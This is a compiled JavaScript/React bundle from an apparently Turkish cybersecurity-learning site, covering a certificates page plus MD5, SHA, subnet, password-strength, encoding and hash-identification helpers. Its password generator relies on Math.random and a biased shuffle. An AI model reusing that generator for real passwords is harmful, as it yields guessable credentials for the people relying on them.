    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(AppHeader, { navigate, active: "" }), /* @__PURE__ */ React.createElement("main", { className: "max-w-[1080px] mx-auto px-6 py-10" }, /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("dashboard"), className: "text-sm text-[#74998a] hover:text-[#00ff88] transition-colors mb-6" }, "\u2190 Dashboard'a d\xF6n"), /* @__PURE__ */ React.createElement("div", { className: "mb-8" }, /* @__PURE__ */ React.createElement(SectionLabel, null, "Do\u011Frulanabilir"), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(28px,4vw,42px)] text-[#eafff5]" }, "Sertifikalar\u0131m"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] mt-2" }, "Tamamlad\u0131\u011F\u0131n yollar i\xE7in kazand\u0131\u011F\u0131n sertifikalar. Her biri do\u011Frulanabilir bir koda sahiptir.")), !user.nameChanged ? /* @__PURE__ */ React.createElement("div", { className: "rounded-2xl border border-[#ff8c42]/30 p-6 mb-8 bg-[#ff8c42]/5 space-y-4" }, /* @__PURE__ */ React.createElement("h3", { className: "text-[#ffd166] font-disp font-bold flex items-center gap-2" }, "\u26A0\uFE0F Sertifika \u0130smi Belirleme"), /* @__PURE__ */ React.createElement("p", { className: "text-sm text-[#74998a] leading-relaxed" }, "Sertifikalar\u0131n\u0131zda g\xF6r\xFCnmesini istedi\u011Finiz resmi ad\u0131n\u0131z\u0131 ve soyad\u0131n\u0131z\u0131 yaz\u0131n.", /* @__PURE__ */ React.createElement("strong", { className: "text-[#ffd166] block mt-1" }, "\u26A0\uFE0F \xD6NEML\u0130 UYARI: Buraya yazaca\u011F\u0131n\u0131z isim daha sonra kesinlikle de\u011Fi\u015Ftirilemez!")), /* @__PURE__ */ React.createElement("div", { className: "flex items-center gap-3 flex-wrap" }, /* @__PURE__ */ React.createElement("input", { value: newName, onChange: (e) => setNewName(e.target.value), placeholder: "Ad\u0131n\u0131z Soyad\u0131n\u0131z", className: "bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm w-64" }), /* @__PURE__ */ React.createElement("button", { onClick: saveName, className: "font-mono text-sm font-bold text-[#021008] bg-[#ffd166] px-5 py-2.5 rounded-lg hover:shadow-[0_0_20px_-4px_rgba(255,209,102,.5)] transition-all" }, "\u0130smi Kaydet ve Kilitle"))) : /* @__PURE__ */ React.createElement("div", { className: "rounded-2xl border border-[#103a26] p-5 mb-8 bg-[rgba(0,255,136,.02)] flex items-center justify-between gap-4 flex-wrap" }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center gap-2.5" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88]" }, "\u{1F512}"), /* @__PURE__ */ React.createElement("p", { className: "text-sm text-[#74998a]" }, "Sertifika \u0130sminiz Kilitlendi: ", /* @__PURE__ */ React.createElement("strong", { className: "text-[#eafff5] font-mono" }, user.name))), /* @__PURE__ */ React.createElement("span", { className: "text-xs text-[#5c8a74] font-mono" }, "// De\u011Fi\u015Ftirilemez")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 lg:grid-cols-2 gap-5" }, certs.map((c, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "rounded-2xl border overflow-hidden " + (c.done ? "border-[#103a26] hover:border-[#00ff88] transition-all" : "border-[#0c2719]") }, /* @__PURE__ */ React.createElement("div", { className: "relative p-5 border-b border-[#0c2719] cursor-pointer", style: { background: c.done ? "linear-gradient(135deg,#08120d,#04100a)" : "#050f0a" }, onClick: () => c.done && setPreview(c) }, c.done ? /* @__PURE__ */ React.createElement(CertVisual, { cert: c }) : /* @__PURE__ */ React.createElement("div", { className: "relative p-4" }, /* @__PURE__ */ React.createElement("div", { className: "absolute inset-0 opacity-[.06] pointer-events-none", style: { backgroundImage: "linear-gradient(rgba(0,255,136,.5) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.5) 1px,transparent 1px)", backgroundSize: "20px 20px" } }), /* @__PURE__ */ React.createElement("div", { className: "relative flex items-start justify-between" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("div", { className: "flex items-center gap-2 mb-3" }, /* @__PURE__ */ React.createElement("span", { className: "w-7 h-7 border border-[#00ff88] rounded grid place-items-center text-[#00ff88] font-mono text-[11px] font-bold" }, ">_"), /* @__PURE__ */ React.createElement("span", { className: "font-disp font-bold text-sm text-[#eafff5]" }, "siberkampus")), /* @__PURE__ */ React.createElement("p", { className: "font-mono text-[10px] text-[#74998a] tracking-widest uppercase" }, "Tamamlama Sertifikas\u0131"), /* @__PURE__ */ React.createElement("h3", { className: "font-disp font-bold text-xl mt-2 text-[#74998a]", style: { maxWidth: "260px", lineHeight: 1.25 } }, c.title)), /* @__PURE__ */ React.createElement("span", { className: "text-3xl", style: { filter: "grayscale(1) opacity(.5)" } }, "\u{1F512}")))), /* @__PURE__ */ React.createElement("div", { className: "p-5 flex items-center justify-between gap-3", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, c.done ? /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("span", { className: "font-mono text-xs text-[#74998a]" }, "Kod: ", /* @__PURE__ */ React.createElement("span", { className: "text-[#5cffba]" }, c.code)), /* @__PURE__ */ React.createElement("div", { className: "flex gap-2" }, /* @__PURE__ */ React.createElement("button", { onClick: () => downloadCert(c), className: "text-xs font-bold text-[#021008] bg-[#00ff88] px-4 py-2 rounded-lg hover:shadow-[0_0_20px_-4px_var(--glow)] transition-all" }, "\u2913 PDF \u0130ndir"), /* @__PURE__ */ React.createElement("button", { onClick: () => setPreview(c), className: "text-xs text-[#cdeede] border border-[#103a26] px-4 py-2 rounded-lg hover:border-[#00ff88] hover:text-[#00ff88] transition-colors" }, "G\xF6r\xFCnt\xFCle"))) : /* @__PURE__ */ React.createElement("div", { className: "w-full" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between text-xs text-[#74998a] mb-2" }, /* @__PURE__ */ React.createElement("span", null, "Tamamlanan: ", c.tasksDone, "/", c.tasksRequired, " g\xF6rev"), /* @__PURE__ */ React.createElement("span", { className: "text-[#ffd166]" }, c.prog, "%")), /* @__PURE__ */ React.createElement("div", { className: "h-2 rounded-full bg-[#0c2719] overflow-hidden" }, /* @__PURE__ */ React.createElement("div", { className: "h-full rounded-full bg-gradient-to-r from-[#00d978] to-[#00ff88]", style: { width: c.prog + "%" } }))))))), preview && /* @__PURE__ */ React.createElement("div", { className: "fixed inset-0 bg-black/75 backdrop-blur-sm grid place-items-center z-[80] p-6", onClick: () => setPreview(null) }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[720px] w-full", onClick: (e) => e.stopPropagation() }, /* @__PURE__ */ React.createElement(CertVisual, { cert: preview }), /* @__PURE__ */ React.createElement("div", { className: "flex justify-center gap-3 mt-5" }, /* @__PURE__ */ React.createElement("button", { onClick: () => downloadCert(preview), className: "font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-6 py-3 rounded-lg hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all" }, "\u2913 PDF \u0130ndir"), /* @__PURE__ */ React.createElement("button", { onClick: () => setPreview(null), className: "font-mono text-sm text-[#cdeede] border border-[#103a26] px-6 py-3 rounded-lg hover:border-[#00ff88] hover:text-[#00ff88] transition-colors" }, "Kapat")))), /* @__PURE__ */ React.createElement("div", { className: "mt-10 rounded-2xl border border-[#103a26] p-8 text-center", style: { background: "linear-gradient(90deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("h3", { className: "text-xl text-[#eafff5] mb-2" }, "Yeni bir sertifika kazan"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Bir \xF6\u011Frenme yolunu tamamla ve do\u011Frulanabilir sertifikan\u0131 al."), /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("rooms"), className: "font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-7 py-3 clip-btn hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all" }, "Laboratuvarlar\u0131 G\xF6r \u2192"))), /* @__PURE__ */ React.createElement(Footer, { navigate }));
  };
  function md5(string) {
    function RotateLeft(lValue, iShiftBits) {
      return lValue << iShiftBits | lValue >>> 32 - iShiftBits;
    }
    function AddUnsigned(lX, lY) {
      var lX8, lY8, lX4, lY4, lResult;
      lX8 = lX & 2147483648;
      lY8 = lY & 2147483648;
      lX4 = lX & 1073741824;
      lY4 = lY & 1073741824;
      lResult = (lX & 1073741823) + (lY & 1073741823);
      if (lX4 & lY4) {
        return lResult ^ 2147483648 ^ lX8 ^ lY8;
      }
      if (lX4 | lY4) {
        if (lResult & 1073741824) {
          return lResult ^ 3221225472 ^ lX8 ^ lY8;
        } else {
          return lResult ^ 1073741824 ^ lX8 ^ lY8;
        }
      } else {
        return lResult ^ lX8 ^ lY8;
      }
    }
    function F(x2, y, z) {
      return x2 & y | ~x2 & z;
    }
    function G(x2, y, z) {
      return x2 & z | y & ~z;
    }
    function H(x2, y, z) {
      return x2 ^ y ^ z;
    }
    function I(x2, y, z) {
      return y ^ (x2 | ~z);
    }
    function FF(a2, b2, c2, d2, x2, s, ac) {
      a2 = AddUnsigned(a2, AddUnsigned(AddUnsigned(F(b2, c2, d2), x2), ac));
      return AddUnsigned(RotateLeft(a2, s), b2);
    }
    ;
    function GG(a2, b2, c2, d2, x2, s, ac) {
      a2 = AddUnsigned(a2, AddUnsigned(AddUnsigned(G(b2, c2, d2), x2), ac));
      return AddUnsigned(RotateLeft(a2, s), b2);
    }
    ;
    function HH(a2, b2, c2, d2, x2, s, ac) {
      a2 = AddUnsigned(a2, AddUnsigned(AddUnsigned(H(b2, c2, d2), x2), ac));
      return AddUnsigned(RotateLeft(a2, s), b2);
    }
    ;
    function II(a2, b2, c2, d2, x2, s, ac) {
      a2 = AddUnsigned(a2, AddUnsigned(AddUnsigned(I(b2, c2, d2), x2), ac));
      return AddUnsigned(RotateLeft(a2, s), b2);
    }
    ;
    function ConvertToWordArray(string2) {
      var lWordCount;
      var lMessageLength = string2.length;
      var lNumberOfWords_temp1 = lMessageLength + 8;
      var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - lNumberOfWords_temp1 % 64) / 64;
      var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
      var lWordArray = Array(lNumberOfWords);
      var lBytePosition = 0;
      var lByteCount = 0;
      while (lByteCount < lMessageLength) {
        lWordCount = (lByteCount - lByteCount % 4) / 4;
        lBytePosition = lByteCount % 4 * 8;
        lWordArray[lWordCount] = lWordArray[lWordCount] | string2.charCodeAt(lByteCount) << lBytePosition;
        lByteCount++;
      }
      lWordCount = (lByteCount - lByteCount % 4) / 4;
      lBytePosition = lByteCount % 4 * 8;
      lWordArray[lWordCount] = lWordArray[lWordCount] | 128 << lBytePosition;
      lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
      lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
      return lWordArray;
    }
    ;
    function WordToHex(lValue) {
      var WordToHexValue = "", WordToHexValue_temp = "", lByte, lCount;
      for (lCount = 0; lCount <= 3; lCount++) {
        lByte = lValue >>> lCount * 8 & 255;
        WordToHexValue_temp = "0" + lByte.toString(16);
        WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2);
      }
      return WordToHexValue;
    }
    ;
    function Utf8Encode(string2) {
      string2 = string2.replace(/\r\n/g, "\n");
      var utftext = "";
      for (var n = 0; n < string2.length; n++) {
        var c2 = string2.charCodeAt(n);
        if (c2 < 128) {
          utftext += String.fromCharCode(c2);
        } else if (c2 > 127 && c2 < 2048) {
          utftext += String.fromCharCode(c2 >> 6 | 192);
          utftext += String.fromCharCode(c2 & 63 | 128);
        } else {
          utftext += String.fromCharCode(c2 >> 12 | 224);
          utftext += String.fromCharCode(c2 >> 6 & 63 | 128);
          utftext += String.fromCharCode(c2 & 63 | 128);
        }
      }
      return utftext;
    }
    ;
    var x = Array();
    var k, AA, BB, CC, DD, a, b, c, d;
    var S11 = 7, S12 = 12, S13 = 17, S14 = 22;
    var S21 = 5, S22 = 9, S23 = 14, S24 = 20;
    var S31 = 4, S32 = 11, S33 = 16, S34 = 23;
    var S41 = 6, S42 = 10, S43 = 15, S44 = 21;
    string = Utf8Encode(string);
    x = ConvertToWordArray(string);
    a = 1732584193;
    b = 4023233417;
    c = 2562383102;
    d = 271733878;
    for (k = 0; k < x.length; k += 16) {
      AA = a;
      BB = b;
      CC = c;
      DD = d;
      a = FF(a, b, c, d, x[k + 0], S11, 3614090360);
      d = FF(d, a, b, c, x[k + 1], S12, 3905402710);
      c = FF(c, d, a, b, x[k + 2], S13, 606105819);
      b = FF(b, c, d, a, x[k + 3], S14, 3250441966);
      a = FF(a, b, c, d, x[k + 4], S11, 4118548399);
      d = FF(d, a, b, c, x[k + 5], S12, 1200080426);
      c = FF(c, d, a, b, x[k + 6], S13, 2821735955);
      b = FF(b, c, d, a, x[k + 7], S14, 4249261313);
      a = FF(a, b, c, d, x[k + 8], S11, 1770035416);
      d = FF(d, a, b, c, x[k + 9], S12, 2336552879);
      c = FF(c, d, a, b, x[k + 10], S13, 4294925233);
      b = FF(b, c, d, a, x[k + 11], S14, 2304563134);
      a = FF(a, b, c, d, x[k + 12], S11, 1804603682);
      d = FF(d, a, b, c, x[k + 13], S12, 4254626195);
      c = FF(c, d, a, b, x[k + 14], S13, 2792965006);
      b = FF(b, c, d, a, x[k + 15], S14, 1236535329);
      a = GG(a, b, c, d, x[k + 1], S21, 4129170786);
      d = GG(d, a, b, c, x[k + 6], S22, 3225465664);
      c = GG(c, d, a, b, x[k + 11], S23, 643717713);
      b = GG(b, c, d, a, x[k + 0], S24, 3921069994);
      a = GG(a, b, c, d, x[k + 5], S21, 3593408605);
      d = GG(d, a, b, c, x[k + 10], S22, 38016083);
      c = GG(c, d, a, b, x[k + 15], S23, 3634488961);
      b = GG(b, c, d, a, x[k + 4], S24, 3889429448);
      a = GG(a, b, c, d, x[k + 9], S21, 568446438);
      d = GG(d, a, b, c, x[k + 14], S22, 3275163606);
      c = GG(c, d, a, b, x[k + 3], S23, 4107603335);
      b = GG(b, c, d, a, x[k + 8], S24, 1163531501);
      a = GG(a, b, c, d, x[k + 13], S21, 2850285829);
      d = GG(d, a, b, c, x[k + 2], S22, 4243563512);
      c = GG(c, d, a, b, x[k + 7], S23, 1735328473);
      b = GG(b, c, d, a, x[k + 12], S24, 2368359562);
      a = HH(a, b, c, d, x[k + 5], S31, 4294588738);
      d = HH(d, a, b, c, x[k + 8], S32, 2272392833);
      c = HH(c, d, a, b, x[k + 11], S33, 1839030562);
      b = HH(b, c, d, a, x[k + 14], S34, 4259657740);
      a = HH(a, b, c, d, x[k + 1], S31, 2763975236);
      d = HH(d, a, b, c, x[k + 4], S32, 1272893353);
      c = HH(c, d, a, b, x[k + 7], S33, 4139469664);
      b = HH(b, c, d, a, x[k + 10], S34, 3200236656);
      a = HH(a, b, c, d, x[k + 13], S31, 681279174);
      d = HH(d, a, b, c, x[k + 0], S32, 3936430074);
      c = HH(c, d, a, b, x[k + 3], S33, 3572445317);
      b = HH(b, c, d, a, x[k + 6], S34, 76029189);
      a = HH(a, b, c, d, x[k + 9], S31, 3654602809);
      d = HH(d, a, b, c, x[k + 12], S32, 3873151461);
      c = HH(c, d, a, b, x[k + 15], S33, 530742520);
      b = HH(b, c, d, a, x[k + 2], S34, 3299628645);
      a = II(a, b, c, d, x[k + 0], S41, 4096336452);
      d = II(d, a, b, c, x[k + 7], S42, 1126891415);
      c = II(c, d, a, b, x[k + 14], S43, 2878612391);
      b = II(b, c, d, a, x[k + 5], S44, 4237533241);
      a = II(a, b, c, d, x[k + 12], S41, 1700485571);
      d = II(d, a, b, c, x[k + 3], S42, 2399980690);
      c = II(c, d, a, b, x[k + 10], S43, 4293915773);
      b = II(b, c, d, a, x[k + 1], S44, 2240044497);
      a = II(a, b, c, d, x[k + 8], S41, 1873313359);
      d = II(d, a, b, c, x[k + 15], S42, 4264355552);
      c = II(c, d, a, b, x[k + 6], S43, 2734768916);
      b = II(b, c, d, a, x[k + 13], S44, 1309151649);
      a = II(a, b, c, d, x[k + 4], S41, 4149444226);
      d = II(d, a, b, c, x[k + 11], S42, 3174756917);
      c = II(c, d, a, b, x[k + 2], S43, 718787259);
      b = II(b, c, d, a, x[k + 9], S44, 3951481745);
      a = AddUnsigned(a, AA);
      b = AddUnsigned(b, BB);
      c = AddUnsigned(c, CC);
      d = AddUnsigned(d, DD);
    }
    var temp = WordToHex(a) + WordToHex(b) + WordToHex(c) + WordToHex(d);
    return temp.toLowerCase();
  }
  async function getShaHash(algorithm, text) {
    try {
      const encoder = new TextEncoder();
      const data = encoder.encode(text);
      const hashBuffer = await crypto.subtle.digest(algorithm, data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
    } catch (e) {
      return "Hata/Desteklenmiyor (HTTPS gereklidir)";
    }
  }
  var ipRegex = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  var ipToInt = (ip) => ip.split(".").reduce((acc, octet) => acc * 256 + parseInt(octet, 10), 0) >>> 0;
  var intToIp = (num) => [
    num >>> 24 & 255,
    num >>> 16 & 255,
    num >>> 8 & 255,
    num & 255
  ].join(".");
  var ipToBin = (num) => (num >>> 0).toString(2).padStart(32, "0");
  function getIpClass(ip) {
    const firstOctet = parseInt(ip.split(".")[0], 10);
    if (firstOctet >= 1 && firstOctet <= 126) return "A S\u0131n\u0131f\u0131";
    if (firstOctet === 127) return "Loopback (Geri D\xF6ng\xFC)";
    if (firstOctet >= 128 && firstOctet <= 191) return "B S\u0131n\u0131f\u0131";
    if (firstOctet >= 192 && firstOctet <= 223) return "C S\u0131n\u0131f\u0131";
    if (firstOctet >= 224 && firstOctet <= 239) return "D S\u0131n\u0131f\u0131 (Multicast)";
    if (firstOctet >= 240 && firstOctet <= 255) return "E S\u0131n\u0131f\u0131 (Deneysel)";
    return "Bilinmeyen";
  }
  function calculateSubnet(ipStr, cidr) {
    if (!ipRegex.test(ipStr)) {
      return { error: "Ge\xE7ersiz IP Adresi format\u0131! \xD6rn: 192.168.1.1" };
    }
    const ipInt = ipToInt(ipStr);
    const netMask = cidr === 0 ? 0 : ~0 << 32 - cidr >>> 0;
    const netAddr = (ipInt & netMask) >>> 0;
    const broadAddr = (ipInt | ~netMask) >>> 0;
    let hostCount = Math.pow(2, 32 - cidr);
    let usableHosts = hostCount - 2;
    let firstUsable = netAddr + 1 >>> 0;
    let lastUsable = broadAddr - 1 >>> 0;
    if (cidr === 32) {
      usableHosts = 1;
      firstUsable = netAddr;
      lastUsable = netAddr;
    } else if (cidr === 31) {
      usableHosts = 2;
      firstUsable = netAddr;
      lastUsable = broadAddr;
    } else if (cidr === 0) {
      usableHosts = hostCount;
      firstUsable = 0;
      lastUsable = 4294967295;
    }
    return {
      netMask: intToIp(netMask),
      netAddr: intToIp(netAddr),
      broadAddr: intToIp(broadAddr),
      firstUsable: intToIp(firstUsable),
      lastUsable: intToIp(lastUsable),
      hostCount,
      usableHosts: usableHosts < 0 ? 0 : usableHosts,
      ipClass: getIpClass(ipStr),
      ipBin: ipToBin(ipInt),
      maskBin: ipToBin(netMask)
    };
  }
  function formatTime(seconds) {
    if (seconds === Infinity || seconds > 1e30) return "Sonsuz Y\u0131l";
    const years = seconds / (3600 * 24 * 365.25);
    if (years >= 1) {
      if (years > 1e9) return Math.round(years / 1e9) + " Milyar Y\u0131l";
      if (years > 1e6) return Math.round(years / 1e6) + " Milyon Y\u0131l";
      return Math.round(years).toLocaleString("tr-TR") + " Y\u0131l";
    }
    const days = seconds / (3600 * 24);
    if (days >= 1) return Math.round(days) + " G\xFCn";
    const hours = seconds / 3600;
    if (hours >= 1) return Math.round(hours) + " Saat";
    const minutes = seconds / 60;
    if (minutes >= 1) return Math.round(minutes) + " Dakika";
    return Math.round(seconds) + " Saniye";
  }
  function analyzePassword(pass) {
    if (!pass) return null;
    let pool = 0;
    const hasLower = /[a-z]/.test(pass);
    const hasUpper = /[A-Z]/.test(pass);
    const hasNumber = /[0-9]/.test(pass);
    const hasSymbol = /[^a-zA-Z0-9]/.test(pass);
    if (hasLower) pool += 26;
    if (hasUpper) pool += 26;
    if (hasNumber) pool += 10;
    if (hasSymbol) pool += 33;
    const len = pass.length;
    const entropy = pool > 0 ? len * (Math.log(pool) / Math.log(2)) : 0;
    let level = "Zay\u0131f";
    let color = "text-red-500 border-red-500/20 bg-red-500/5";
    if (entropy >= 100) {
      level = "Askeri D\xFCzeyde G\xFC\xE7l\xFC \u{1F48E}";
      color = "text-[#00ff88] border-[#00ff88]/20 bg-[#00ff88]/5";
    } else if (entropy >= 80) {
      level = "G\xFC\xE7l\xFC \u{1F6E1}\uFE0F";
      color = "text-emerald-400 border-emerald-400/20 bg-emerald-400/5";
    } else if (entropy >= 60) {
      level = "Orta Seviye \u{1F9D0}";
      color = "text-yellow-400 border-yellow-400/20 bg-yellow-400/5";
    } else if (entropy >= 40) {
      level = "Zay\u0131f \u26A0\uFE0F";
      color = "text-orange-400 border-orange-400/20 bg-orange-400/5";
    } else {
      level = "Kritik Derecede Zay\u0131f \u{1F6A8}";
      color = "text-red-500 border-red-500/20 bg-red-500/5";
    }
    const combinations = Math.pow(pool, len);
    return {
      entropy: Math.round(entropy * 10) / 10,
      level,
      color,
      combinations,
      hasLower,
      hasUpper,
      hasNumber,
      hasSymbol,
      poolSize: pool,
      crackTimes: {
        online: combinations / 100,
        offlineSlow: combinations / 1e6,
        offlineFast: combinations / 1e10
      }
    };
  }
  function generatePassword(len, lower, upper, num, sym) {
    let chars = "";
    if (lower) chars += "abcdefghijklmnopqrstuvwxyz";
    if (upper) chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if (num) chars += "0123456789";
    if (sym) chars += "!@#$%^&*()_+-=[]{}|;:',./<>?~`";
    if (!chars) return "";
    let res = "";
    const sets = [];
    if (lower) sets.push("abcdefghijklmnopqrstuvwxyz");
    if (upper) sets.push("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
    if (num) sets.push("0123456789");
    if (sym) sets.push("!@#$%^&*()_+-=[]{}|;:',./<>?~`");
    sets.forEach((set) => {
      res += set[Math.floor(Math.random() * set.length)];
    });
    for (let i = res.length; i < len; i++) {
      res += chars[Math.floor(Math.random() * chars.length)];
    }
    return res.split("").sort(() => Math.random() - 0.5).join("");
  }
  var handleEncode = (text, format) => {
    if (!text) return "";
    try {
      switch (format) {
        case "base64":
          return btoa(unescape(encodeURIComponent(text)));
        case "url":
          return encodeURIComponent(text);
        case "hex":
          return [...text].map((c) => c.charCodeAt(0).toString(16).padStart(2, "0")).join(" ");
        case "binary":
          return [...text].map((c) => c.charCodeAt(0).toString(2).padStart(8, "0")).join(" ");
        case "html":
          return text.replace(/[\u00A0-\u9999<>&]/gim, (i) => "&#" + i.charCodeAt(0) + ";");
        default:
          return text;
      }
    } catch (e) {
      return "Hata: Kodlanamad\u0131. " + e.message;
    }
  };
  var handleDecode = (text, format) => {
    if (!text) return "";
    try {
      switch (format) {
        case "base64":
          return decodeURIComponent(escape(atob(text.trim())));
        case "url":
          return decodeURIComponent(text);
        case "hex":
          const cleanHex = text.replace(/[^0-9a-fA-F]/g, "");
          const hexMatches = cleanHex.match(/.{1,2}/g);
          return hexMatches ? hexMatches.map((h) => String.fromCharCode(parseInt(h, 16))).join("") : "";
        case "binary":
          const cleanBin = text.replace(/[^01]/g, "");
          const binMatches = cleanBin.match(/.{1,8}/g);
          return binMatches ? binMatches.map((b) => String.fromCharCode(parseInt(b, 2))).join("") : "";
        case "html":
          const txt = document.createElement("textarea");
          txt.innerHTML = text;
          return txt.value;
        default:
          return text;
      }
    } catch (e) {
      return "Hata: Kodu \xE7\xF6z\xFClemedi. Girdi format\u0131n\u0131n do\u011Fru oldu\u011Fundan emin olun. (" + e.message + ")";
    }
  };
  function detectHashType(hashStr) {
    const clean = hashStr.trim().toLowerCase();
    if (!clean) return null;
    const isHex = /^[0-9a-f]+$/.test(clean);
    const results = [];
    if (isHex) {
      const len = clean.length;
      if (len === 32) {
        results.push({ name: "MD5", conf: "\xC7ok Y\xFCksek", desc: "32 Karakter Hexadecimal hash. Genellikle MD5 algoritmas\u0131 taraf\u0131ndan \xFCretilir. G\xFCn\xFCm\xFCzde zay\u0131f ve \xE7arp\u0131\u015Fma (collision) sald\u0131r\u0131lar\u0131na a\xE7\u0131kt\u0131r." });
        results.push({ name: "MD4", conf: "D\xFC\u015F\xFCk", desc: "MD5'in \xF6nc\xFCl\xFC, tamamen g\xFCvensiz." });
      } else if (len === 40) {
        results.push({ name: "SHA-1", conf: "Y\xFCksek", desc: "40 Karakter Hexadecimal hash. SHA-1 algoritmas\u0131 taraf\u0131ndan \xFCretilir. G\xFCvenli\u011Fi k\u0131r\u0131lm\u0131\u015Ft\u0131r, yeni projelerde kullan\u0131lmamal\u0131d\u0131r." });
      } else if (len === 56) {
        results.push({ name: "SHA-224", conf: "Y\xFCksek", desc: "56 Karakter Hexadecimal hash. SHA-2 ailesinin bir par\xE7as\u0131d\u0131r." });
        results.push({ name: "SHA3-224", conf: "Orta", desc: "Keccak tabanl\u0131 yeni nesil SHA-3 hash algoritmas\u0131." });
      } else if (len === 64) {
        results.push({ name: "SHA-256", conf: "\xC7ok Y\xFCksek", desc: "64 Karakter Hexadecimal hash. Siber g\xFCvenlikte en yayg\u0131n kullan\u0131lan standart veri b\xFCt\xFCnl\xFC\u011F\xFC algoritmas\u0131." });
        results.push({ name: "SHA3-256", conf: "Orta", desc: "SHA-3 standard\u0131n\u0131n 256-bit varyant\u0131." });
      } else if (len === 96) {
        results.push({ name: "SHA-384", conf: "Y\xFCksek", desc: "96 Karakter Hexadecimal hash. Y\xFCksek g\xFCvenlikli sistemler i\xE7in SHA-2 varyant\u0131." });
      } else if (len === 128) {
        results.push({ name: "SHA-512", conf: "Y\xFCksek", desc: "128 Karakter Hexadecimal hash. SHA-2 ailesinin en g\xFC\xE7l\xFC hash algoritmas\u0131." });
        results.push({ name: "SHA3-512", conf: "Orta", desc: "SHA-3 standard\u0131n\u0131n 512-bit varyant\u0131." });
        results.push({ name: "Whirlpool", conf: "D\xFC\u015F\xFCk", desc: "512-bitlik daha az yayg\u0131n kullan\u0131lan bir blok \u015Fifreleme tabanl\u0131 hash." });
      } else if (len === 8) {
        results.push({ name: "CRC-32", conf: "Orta", desc: "8 Karakter Hexadecimal. Genellikle a\u011F paketlerinde hata tespiti i\xE7in kullan\u0131l\u0131r, \u015Fifreleme amac\u0131 ta\u015F\u0131maz." });
      } else if (len === 16) {
        results.push({ name: "MySQL323", conf: "D\xFC\u015F\xFCk", desc: "Eski MySQL parola hash format\u0131." });
      }
    }
    if (clean.startsWith("$2a$") || clean.startsWith("$2b$") || clean.startsWith("$2y$")) {
      results.push({ name: "Bcrypt", conf: "\xC7ok Y\xFCksek", desc: "Blowfish \u015Fifrelemesine dayal\u0131 yava\u015F ve g\xFCvenli parola hashing standard\u0131. Salting i\u015Flemini otomatik i\xE7erir. Brute force sald\u0131r\u0131lar\u0131na kar\u015F\u0131 son derece diren\xE7lidir." });
    } else if (clean.startsWith("$argon2id$") || clean.startsWith("$argon2i$") || clean.startsWith("$argon2d$")) {
      results.push({ name: "Argon2", conf: "\xC7ok Y\xFCksek", desc: "PHC yar\u0131\u015Fmas\u0131 birincisi olan en modern parola hashing standard\u0131. Bellek-sert (memory-hard) yap\u0131s\u0131yla GPU tabanl\u0131 brute-force sald\u0131r\u0131lar\u0131n\u0131 engeller." });
    } else if (clean.startsWith("$1$")) {
      results.push({ name: "MD5-Crypt", conf: "Y\xFCksek", desc: "MD5 tabanl\u0131 tuzlanm\u0131\u015F (salted) eski UNIX parola hash bi\xE7imi." });
    } else if (clean.startsWith("$5$")) {
      results.push({ name: "SHA-256-Crypt", conf: "Y\xFCksek", desc: "SHA-256 tabanl\u0131 tuzlanm\u0131\u015F UNIX parola hash bi\xE7imi." });
    } else if (clean.startsWith("$6$")) {
      results.push({ name: "SHA-512-Crypt", conf: "Y\xFCksek", desc: "SHA-512 tabanl\u0131 tuzlanm\u0131\u015F UNIX parola hash bi\xE7imi." });
    } else if (clean.startsWith("$apr1$")) {
      results.push({ name: "Apache MD5", conf: "Y\xFCksek", desc: "Apache htpasswd taraf\u0131ndan kullan\u0131lan MD5 varyant\u0131." });
    } else if (clean.startsWith("$pbkdf2$")) {
      results.push({ name: "PBKDF2", conf: "Y\xFCksek", desc: "HMAC tabanl\u0131 standart anahtar t\xFCretme fonksiyonu. Parola korumas\u0131 i\xE7in yayg\u0131nd\u0131r." });
    }
    if (results.length === 0) {
      results.push({ name: "Bilinmeyen Format", conf: "Belirsiz", desc: "Girdi\u011Finiz hash deseni bilinen standart uzunluklar veya \xF6nekler (prefix) ile e\u015Fle\u015Fmedi. Karakter seti: " + (isHex ? "Hexadecimal" : "Base64/Di\u011Fer") + ", Uzunluk: " + clean.length + " karakter." });
    }
    return results;
  }
  var formatBin = (binStr, cidr) => {
    let formatted = [];
    for (let i = 0; i < 32; i++) {
      if (i > 0 && i % 8 === 0) {
        formatted.push(/* @__PURE__ */ React.createElement("span", { key: "dot-" + i, className: "text-[#5c8a74] mx-0.5" }, "."));
      }
      const isNet = i < cidr;
      formatted.push(
        /* @__PURE__ */ React.createElement("span", { key: i, className: isNet ? "text-[#00ff88] font-bold" : "text-[#547464]" }, binStr[i])
      );
    }
